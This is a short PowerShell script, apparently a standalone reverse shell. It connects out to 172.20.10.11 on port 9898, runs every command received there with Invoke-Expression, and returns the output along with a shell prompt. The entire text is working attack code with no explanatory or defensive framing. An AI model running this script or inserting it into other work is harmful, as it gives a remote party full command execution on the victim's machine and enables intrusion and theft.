$ip = "172.20.10.11"
$port = 9898

$tcp = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $tcp.GetStream()

[byte[]]$bytes = 0..255 | ForEach-Object { 0 }
while ($true) {
    $i = $stream.Read($bytes, 0, $bytes.Length)
    if ($i -eq 0) { break }
    
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1) | Out-String
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$tcp.Close()
